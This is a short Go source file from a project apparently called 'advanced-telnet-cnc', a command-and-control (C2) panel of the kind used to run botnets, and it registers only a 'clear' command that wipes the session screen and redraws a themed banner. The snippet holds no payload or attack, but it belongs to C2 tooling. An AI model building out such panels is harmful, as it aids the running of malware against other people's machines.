package user

import (
	"advanced-telnet-cnc/source/master/command"
	sessions "advanced-telnet-cnc/source/master/session"
	"advanced-telnet-cnc/source/master/termfx"
)

func init() {
	command.Make(&command.Command{
		Aliases:     []string{"clear", "cls", "c"},
		Description: "Clears the command and control (C2) screen.",
		Admin:       false,
		Executor: func(args []string, fx *termfx.TermFX, session *sessions.Session) error {
			session.Clear()
			return fx.Execute(""+session.Theme.Name+"/banner.lufx", true, fx.Elements(nil))
		},
	})
}
